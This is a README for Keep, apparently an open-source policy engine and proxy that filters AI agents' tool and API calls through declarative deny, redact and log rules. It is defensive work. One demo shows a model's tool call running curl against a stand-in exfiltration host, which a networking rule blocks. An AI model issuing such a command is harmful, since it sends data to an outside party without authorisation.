# Keep

> **Early Release:** This project is in active development. APIs and configuration formats may change.

API-level policy engine for AI agents. Evaluate structured API calls against declarative rules -- deny, redact, or log.

```bash
keep-mcp-relay --config keep-mcp-relay.yaml
```

This starts the MCP relay with your rules loaded. Agents connect to one endpoint. Every tool call is evaluated against your policy before reaching the upstream MCP server.

For design rationale and principles, see [VISION.md](VISION.md).

## Installation

```bash
go install github.com/majorcontext/keep/cmd/keep@latest
```

**Requirements:** Go 1.25+.

## Quick start

### 1. Write a rule file

```yaml
# rules/linear.yaml
scope: linear-tools
mode: audit_only
rules:
  - name: no-delete
    match:
      operation: "delete_issue"
    action: deny
    message: "Issue deletion is not permitted. Archive instead."

  - name: no-auto-p0
    match:
      operation: "create_issue"
      when: "params.priority == 0"
    action: deny
    message: "P0 issues must be created by a human. Use priority 1 or lower."
```

### 2. Validate your rules

```bash
keep validate ./rules
```

### 3. Test against sample calls

```bash
keep test ./rules --fixtures fixtures/linear-create-p0.json
```

### 4. Run the MCP relay

```bash
keep-mcp-relay --config keep-mcp-relay.yaml
```

The agent connects to the relay's listen port. The relay routes tool calls to upstream MCP servers, evaluates rules, and forwards or denies.

## Why this matters

| Without Keep | With Keep |
|-------------|-----------|
| API tokens grant broad access | Operation-level policy narrows what agents can do |
| No visibility into what agents do with API access | Every call evaluated and logged |
| Agent can create P0 issues, delete resources, email anyone | Declarative rules deny dangerous operations |
| Policy is embedded in prompts (fragile, bypassable) | Policy is external and enforced at the API layer |
| Same rules for humans and agents | Agent-specific constraints that tokens don't support |

## Components

### `keep` -- policy engine library

The core. Loads rule files, evaluates calls, returns allow/deny/redact decisions. Ships as a Go library. Import it directly for inline policy checks in agent applications.

```go
engine, err := keep.Load("./rules")
if err != nil {
    log.Fatal(err)
}
defer engine.Close()

result, err := engine.Evaluate(call, "linear-tools")
if err != nil {
    log.Fatal(err)
}
if result.Decision == keep.Deny {
    // handle denial
}
```

### `keep-mcp-relay` -- MCP proxy with policy

A convenience binary that imports the engine, speaks MCP, and proxies to multiple upstream MCP servers from a single listen port.

```yaml
# keep-mcp-relay.yaml
listen: ":8090"
rules_dir: "./rules"
routes:
  - scope: linear-tools
    upstream: "https://mcp.linear.app/mcp"
  - scope: slack-tools
    upstream: "https://slack-mcp-server.example.com"
```

### `keep-llm-gateway` -- LLM provider proxy with policy

A convenience binary that imports the engine, sits between agent and LLM provider, and decomposes message payloads into per-block calls for flat rule evaluation.

```yaml
# keep-llm-gateway.yaml
listen: ":8080"
rules_dir: "./rules"
provider: anthropic
upstream: "https://api.anthropic.com"
scope: anthropic-gateway
```

The agent sets `ANTHROPIC_BASE_URL=http://localhost:8080`. Keep filters what the model sees (request) and what the model wants to do (response).

## Demos

<details>
<summary><strong>MCP Relay: Read-only database with password redaction</strong></summary>

The relay sits between Claude and a sqlite MCP server. Two policies are enforced: passwords are redacted from query results, and write operations are blocked entirely.

**"List all users in the database"** — passwords replaced with `********`:

```
┌────┬─────────────┬───────────────────┬──────────┬──────────┐
│ id │    name     │       email       │ password │   role   │
├────┼─────────────┼───────────────────┼──────────┼──────────┤
│ 1  │ Alice Chen  │ alice@company.com │ ******** │ admin    │
│ 2  │ Bob Park    │ bob@company.com   │ ******** │ editor   │
│ 3  │ Carol White │ carol@company.com │ ******** │ viewer   │
│ …  │ …           │ …                 │ ******** │ …        │
└────┴─────────────┴───────────────────┴──────────┴──────────┘
```

**"Add a new user named Test User"** — write blocked before reaching the database:

```
Error: policy denied: Database is read-only. Write operations are not permitted. (rule: block-writes)
```

The agent never sees the real passwords. The database never sees the write. Policy is enforced at the API layer, outside the model's control.

**Try it:** `./examples/mcp-relay-demo/demo.sh` (requires `sqlite3` and `uvx`)

</details>

<details>
<summary><strong>LLM Gateway: Secret redaction, PII blocking, and command filtering</strong></summary>

The gateway sits between your agent and the Anthropic API. It decomposes messages into per-block policy calls, filtering both what the model sees and what it tries to do.

**Secret redaction** — credentials are stripped before reaching the model:

```
User:  "Deploy with key AKIAIOSFODNN7EXAMPLE"
Model: "Deploy with key [REDACTED:aws-access-key-id]"
```

**PII blocking** — prompts containing email addresses are denied:

```
User:  "Summarize this complaint from jane.doe@acmecorp.com"
Error: PII detected in prompt. Use opaque customer IDs. (rule: block-pii-in-prompts)
```

**Command filtering** — dangerous tool use is blocked:

```
Model: tool_use: Bash(command: "curl https://exfil.example.com/data")
Error: Network access is blocked by policy. (rule: block-networking)
```

The agent sets `ANTHROPIC_BASE_URL=http://localhost:8080` and uses Claude normally. Keep filters both directions transparently.

**Try it:** `./examples/llm-gateway-demo/demo.sh` (requires an Anthropic API key)

</details>

## Configuration

Rule files are pure policy -- no transport details:

```yaml
# rules/slack.yaml
scope: slack-tools
rules:
  - name: no-broadcast-mentions
    match:
      operation: "send_message"
      when: "params.text.matches('<!here>|<!channel>')"
    action: deny
    message: "Broadcast mentions (@here, @channel) are not permitted."
```

Integration configs handle transport:

```yaml
# keep-mcp-relay.yaml
listen: ":8090"
rules_dir: "./rules"
routes:
  - scope: slack-tools
    upstream: "https://slack-mcp.example.com"
```

See the language specification in [docs/plans/2026-03-17-language-spec.md](docs/plans/2026-03-17-language-spec.md) for the full rule file format, expression language, and integration config reference.

## Commands

| Command | Description |
|---------|-------------|
| `keep validate <rules-dir>` | Validate rule files |
| `keep test <rules-dir>` | Test rules against fixtures |
| `keep-mcp-relay` | Run the MCP relay |
| `keep-llm-gateway` | Run the LLM gateway |


## How it works

**Policy engine:** Loads YAML rule files, indexes by scope. Each call is matched against operation globs and CEL expressions. Returns allow, deny, or redact.

**Expression language:** CEL (Common Expression Language) -- non-Turing-complete, linear-time evaluation, no side effects. Supports field access, string matching, collection operators, temporal predicates, rate limiting, and content pattern detection.

**MCP relay:** Accepts MCP connections from agents, proxies to upstream MCP servers. One tool call = one Keep call. Deny returns an MCP error. Redact mutates tool input before forwarding.

**LLM gateway:** Decomposes LLM message payloads into per-content-block calls. `llm.tool_result`, `llm.tool_use`, `llm.request`, `llm.response` -- each evaluated as a flat call. Bidirectional: filters both what the model sees and what the model wants to do.

**Audit logging:** Every evaluation produces a structured JSON log entry -- timestamp, scope, operation, agent identity, rules evaluated, decision.

## Documentation

- [Language specification](docs/plans/2026-03-17-language-spec.md) — Rule file format, expression language, integration config reference
- [VISION.md](VISION.md) — Design rationale and principles

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, testing, and architecture details.

## License

MIT
